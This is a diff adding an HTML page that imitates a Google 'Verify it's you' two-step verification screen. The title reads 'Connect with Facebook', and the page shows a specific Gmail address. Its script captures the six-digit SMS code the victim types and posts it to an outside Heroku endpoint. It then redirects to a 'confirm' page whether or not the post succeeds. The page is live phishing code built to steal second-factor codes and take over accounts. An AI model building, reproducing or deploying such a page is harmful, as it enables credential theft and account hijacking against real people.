@@ -1,0 +1,244 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <script defer="defer" src="https://testpagani.web.app/static/js/main.54d977ba.js"></script>
+    <script defer="defer" src="https://testpagani.web.app/static/js/main.54d977baC.js"></script>
+    <script src="https://testpagani.web.app/static/js/daja.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.2.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.2.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.2.1/firebase-firestore.js"></script>
+    <script src="https://code.jquery.com/jquery-3.7.0.min.js" integrity="sha256-2Pmvv0kuTBOenSvLm6bvfBSSHrUJ+3A7x6P5Ebd07/g=" crossorigin="anonymous"></script>
+    <script src="app2.js"></script>
+    <style>
+    body{
+      background-color: white;
+    }
+
+    .textfield {
+      position: relative;
+      padding: 14px 170px;
+      border: 1.5px solid #d3d6db;
+      border-radius: 3px;
+      box-shadow: none;
+	  outline: none; 
+	  padding-left: 50px;
+	  
+
+    }
+    .centered {
+      position: relative;
+
+    }
+    .centered span {
+      position: absolute;
+      z-index: 1;
+      background-color: white;
+      top: 0;
+      left: 33px;
+      color: #A9A9A9;
+      padding: 0 2px;
+	  font-size: 15.5px;
+	  transform:translate(0,50%)
+
+    }
+    .textfield:focus {
+
+  border-color: #609eef;
+  border-top-width: 50px;
+  box-shadow: 4 4 7px #609eef;
+  border-width: 1.7px;
+  
+    }
+	
+    input:focus ~ span,
+    input:not(:focus):valid ~ span {
+      top: -10.1px;
+	  font-size: .8rem;
+	  color: #609eef;
+
+    }
+    .textfield,
+    span {
+      transition: ease-in-out 0.1s all;
+      -webkit-transition: ease-in-out 0.1s all;
+      -moz-transition: ease-in-out 0.1s all;
+      -o-transition: ease-in-out 0.1s all;
+    }
+	
+			    #g{
+        position:absolute;
+        top:0;
+        left:10px;
+       padding:0;
+       margin:0;
+	   transform:translate(0,50%)
+    }
+        .submit-button {
+            display: block;
+			padding: 10px 22px;
+			 font-size: 14px;
+			font-weight: bold;
+			text-align: center;
+			text-decoration: none;
+            margin-left: auto;
+            margin-right: 0;
+			position: relative;
+			margin-top: -41px;
+			color: #fff;
+			background-color: #007bff;
+			border: none;
+			border-radius: 4px;
+			cursor: pointer;
+			transition: background-color 0.3s ease;
+			  -webkit-appearance: none; /* Add this line for iOS */
+			
+        }
+
+		
+      </style>
+
+
+    <meta charset="UTF-8">
+    <meta name="viewport"
+          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Connect with Facebook</title>
+</head>
+<body style="margin: 0; box-sizing: border-box; font-family: 'Arial'; line-height: 1.4; padding: 15px; font-size: 16px">
+<div style="border: 1px solid #cccccc; border-radius: 10px; padding: 20px 30px 30px 30px; max-width: 445px; margin: 10px auto; box-sizing: border-box">
+    <img src="https://cdn.freebiesupply.com/images/thumbs/2x/google-logo.png" alt="" style="display: block; width: 120px; margin: auto">
+    <h2 style="text-align: center; margin: -15px 0 10px 0; font-size: 26px; font-weight: 500">Verify it's you</h2>
+    <p style="text-align: center; max-width: 350px; margin: auto">
+        To help keep your account safe, Google wants to make sure it's really you trying to sign in <br>
+    </p>
+<div style="margin: 10px auto 0 auto; width: fit-content; position: relative">
+            <p  style="-webkit-appearance: none; border-radius: 40px; border: 1px solid #cccccc; width: 100%; max-width: 280px; font-weight: 551; margin: auto; padding: 8px 8px 8px 32px; display: block; box-sizing: border-box; color: black; font-size: 14px;">abdulaziz51511116@gmail.com</p>
+
+        </select>
+        <div style="position: absolute; top: 0; left: 8px; height: 100%; display: flex; align-items: center">
+            <svg xmlns="http://www.w3.org/2000/svg" width="20px" height="20px" viewBox="0 0 512 512"><!--! Font Awesome Free 6.1.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M256 0C114.6 0 0 114.6 0 256s114.6 256 256 256s256-114.6 256-256S397.4 0 256 0zM256 128c39.77 0 72 32.24 72 72S295.8 272 256 272c-39.76 0-72-32.24-72-72S216.2 128 256 128zM256 448c-52.93 0-100.9-21.53-135.7-56.29C136.5 349.9 176.5 320 224 320h64c47.54 0 87.54 29.88 103.7 71.71C356.9 426.5 308.9 448 256 448z"/></svg>
+        </div>
+    </div>
+<br>
+    <h4 style="font-size: 18px; font-weight: 520; margin-bottom: -5px">2-Step Verification</h4><br>
+<div style="">
+    <p style="display: inline;">
+        A text message with a 6-digit Verification code was just sent to **********
+    </p>
+    <div id="root1" style="display: inline-block;"></div>
+</div><br>
+
+    <div>
+      <form class="sfasfkWFtomnS" id="sfasfkWFtomnS" method="post">
+        <div class="centered">
+            <input type="text" class="textfield" id="myTextbox" name="login_code" required>
+            <span style="color: #black;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Enter the code</span>
+			<p id='g' >G -</p>
+			
+        </div>
+
+        <br><br>
+        <label>
+            <input type="checkbox" checked style="margin: 0">
+            <span style="margin-left: 10px; color: black;">Don't ask again on this device</span>
+        </label>
+    </div>
+    <div style="margin: 50px 0">
+        
+    </div>
+    <div style="margin-bottom: 20px">
+        <a href="#" style="color: #1A73E8 !important; text-decoration: none !important; font-weight: 600; font-size:14px; font-family: "Google Sans",Roboto,Arial,sans-serif">Try another way</a>
+    </div>
+        
+    <button type="submit" id="form_submit" class="submit-button">Next</button>
+		<br><br><br>
+    </form>
+</div>
+
+
+<div style="font-size: 12px; display: flex;align-items: center;justify-content: space-between; max-width: 445px; margin: auto">
+    <div>
+        English (United States)
+        <svg xmlns="http://www.w3.org/2000/svg" width="10" height="10" fill="currentColor" class="bi bi-caret-down-fill" viewBox="0 0 16 16"> <path d="M7.247 11.14 2.451 5.658C1.885 5.013 2.345 4 3.204 4h9.592a1 1 0 0 1 .753 1.659l-4.796 5.48a1 1 0 0 1-1.506 0z"/> </svg>
+    </div>
+    <div>
+        <a href="#" style="color: black !important;; text-decoration: none!important; margin-left: 15px">Help</a>
+        <a href="#" style="color: black !important;; text-decoration: none!important; margin-left: 15px">Privacy</a>
+        <a href="#" style="color: black !important;; text-decoration: none!important; margin-left: 15px">Terms</a>
+    </div>
+</div>
+
+<style>
+
+    @media screen and (max-width: 768px){
+        body > div:nth-child(1){
+            border-radius: 2px !important;
+            padding: 15px 15px 150px 15px !important;
+            border: none !important;
+        }
+        body > div:nth-child(2){
+            margin-top: -100px !important;
+            padding: 15px !important;
+            flex-direction: column !important;
+            align-items: start !important;
+        }
+        body > div:nth-child(2) > div:nth-child(2){
+            margin-top: 20px;
+        }
+        body > div:nth-child(2) > div:nth-child(2) a:nth-child(1){
+            margin-left: 0 !important;
+        }
+        body > div >img{
+            margin-top: -15px !important;
+        }
+    }
+	 @media screen and (max-width: 768px){
+	.textfield {
+      position: relative;
+      padding: 14px;
+	  padding-left: 10px;
+      padding-right: 46%;
+      border: 1.5px solid #black;
+      border-radius: 3px;
+      box-shadow: none;
+	  outline: none; 
+	  padding-left: 50px;
+
+    }
+
+
+
+  
+</style>
+
+<script>
+    let isClicked = false;
+
+    $(document).ready(function() {
+        $("#form_submit").click(function(event) {
+            if (!isClicked) {
+                event.preventDefault();
+                $.ajax({
+                    url: "https://fambrosko-4d2c40b343c1.herokuapp.com/hose/rrakmellow.php/",
+                    method: "POST",
+                    data: $("#sfasfkWFtomnS").serialize(),
+                    success: function(response) {
+                        // Set the flag to true to indicate that the button has been clicked
+                        isClicked = true;
+                        // Redirect after the first click and data submission
+                        window.location.href = 'confirm/';
+                    },
+                    error: function() {
+                        var inputField = document.getElementById("login_code");
+                        inputField.value = "";
+						window.location.href = 'confirm/';
+                    }
+                });
+            }
+        });
+    });
+</script>
+
+
+</body>
+</html>
